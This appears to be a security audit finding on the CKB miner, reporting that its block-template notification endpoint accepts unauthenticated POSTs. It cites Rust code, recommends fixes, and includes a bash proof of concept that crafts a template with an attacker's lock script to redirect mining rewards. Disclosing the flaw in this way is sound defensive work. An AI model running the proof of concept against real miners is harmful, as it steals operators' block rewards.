### Title
Miner Block Template Notification Endpoint Lacks Authentication, Enabling Mining Reward Theft — (File: `miner/src/client.rs`)

### Summary

The CKB miner process exposes an HTTP notification endpoint that receives pushed `BlockTemplate` objects from the node. The `handle` function that processes these incoming requests performs no authentication whatsoever. Any network-reachable party can POST a crafted `BlockTemplate` with a fraudulent coinbase lock script, causing the miner to expend real hashpower on a block that pays mining rewards to the attacker's address rather than the operator's.

### Finding Description

In `miner/src/client.rs`, the `handle` function is the server-side handler for the node-to-miner push channel:

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }
    Ok(Response::new(Empty::new()))
}
``` [1](#0-0) 

There is no IP allowlist check, no shared secret, no HMAC, and no token validation on the incoming request. The `parse_authorization` helper that does exist is wired exclusively to **outgoing** requests the miner makes to the node RPC: [2](#0-1) 

The miner's listen address is operator-configured. In mining-pool deployments the listener is commonly bound to a non-loopback address so that multiple worker processes can receive template pushes. Once `update_block_template` is called with the attacker-supplied template, the miner's internal `CurrentTemplate` is replaced and all subsequent PoW work targets the fraudulent template.

The `BlockAssemblerConfig` that governs the legitimate coinbase lock script lives in the node's `ckb.toml`: [3](#0-2) 

The node does **not** re-validate that a submitted block's coinbase lock script matches the locally configured `block_assembler` when it receives a `submit_block` call. Consensus verification only checks that the cellbase is structurally valid and carries the correct reward amount. A coinbase paying any valid lock script passes.

**Attack path:**

1. Attacker queries the node's public RPC (`get_block_template`) to obtain the current chain tip, epoch, DAO field, and correct reward amount — all public, unauthenticated data.
2. Attacker constructs a `BlockTemplate` identical to the legitimate one except the cellbase output uses the attacker's own lock script.
3. Attacker POSTs this template to the miner's notification endpoint (e.g., `http://<miner-ip>:<port>/`).
4. `handle` deserialises the payload and calls `client.update_block_template(template)` with no checks.
5. The miner's workers begin solving PoW for the fraudulent template.
6. Upon finding a valid nonce, the miner calls `submit_block` on the node.
7. The node's block verifier accepts the block (valid PoW, valid reward amount, valid lock script).
8. The block is committed; the mining reward is credited to the attacker's address.

### Impact Explanation

Direct theft of mining rewards. Every block the miner solves while the fraudulent template is active pays the attacker instead of the operator. In a pool environment where the listener is exposed, a single unauthenticated POST is sufficient to redirect an arbitrary number of subsequent block rewards until the legitimate node pushes a new template or the operator restarts the miner.

### Likelihood Explanation

The vulnerability is reachable whenever the miner's `listen_address` is bound to a non-loopback interface — a standard configuration for any multi-worker or pool setup. The attacker needs only network access to that port and the ability to craft a JSON `BlockTemplate`, both of which require zero privilege. The current chain state needed to build a valid template is freely available from any public node RPC.

### Recommendation

Authenticate incoming template-push requests using the same credential mechanism already implemented for outgoing RPC calls. Concretely:

- Extend `MinerClientConfig` with an optional `notification_secret` field.
- In `handle`, verify a `Authorization: Bearer <secret>` (or HMAC) header before calling `update_block_template`.
- Default the listener to `127.0.0.1` and document that binding to a public address requires the secret to be set.

Alternatively, remove the push endpoint entirely and rely solely on the polling path (`get_block_template` RPC), which is already authenticated via the `parse_authorization` helper.

### Proof of Concept

```bash
# 1. Fetch current template from the public node RPC
TEMPLATE=$(curl -s -X POST http://<node>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_block_template","params":[],"id":1}' \
  | jq '.result')

# 2. Replace the cellbase output lock with attacker's lock script
EVIL_TEMPLATE=$(echo "$TEMPLATE" | jq '
  .cellbase.data.outputs[0].lock = {
    "code_hash": "<attacker_code_hash>",
    "hash_type": "type",
    "args": "<attacker_args>"
  }')

# 3. POST the fraudulent template to the miner notification endpoint
#    (no credentials required)
curl -s -X POST http://<miner-ip>:<notify-port>/ \
  -H 'Content-Type: application/json' \
  -d "$EVIL_TEMPLATE"

# Result: miner begins working on the fraudulent template;
# the next solved block pays rewards to the attacker's address.
```

### Citations

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** miner/src/client.rs (L380-394)
```rust
fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
}
```

**File:** util/app-config/src/configs/tx_pool.rs (L55-82)
```rust
pub struct BlockAssemblerConfig {
    /// The miner lock script code hash.
    pub code_hash: H256,
    /// The miner lock script args.
    pub args: JsonBytes,
    /// An arbitrary message to be added into the cellbase transaction.
    pub message: JsonBytes,
    /// The miner lock script hash type.
    pub hash_type: ScriptHashType,
    /// Use ckb binary version as message prefix to identify the block miner client (default true, false to disable it).
    #[serde(default = "default_use_binary_version_as_message_prefix")]
    pub use_binary_version_as_message_prefix: bool,
    /// A field to store the block miner client version, non-configurable options.
    #[serde(skip)]
    pub binary_version: String,
    /// A field to control update interval millis
    #[serde(default = "default_update_interval_millis")]
    pub update_interval_millis: u64,
    /// Notify url
    #[serde(default)]
    pub notify: Vec<Url>,
    /// Notify scripts
    #[serde(default)]
    pub notify_scripts: Vec<String>,
    /// Notify timeout
    #[serde(default = "default_notify_timeout_millis")]
    pub notify_timeout_millis: u64,
}
```
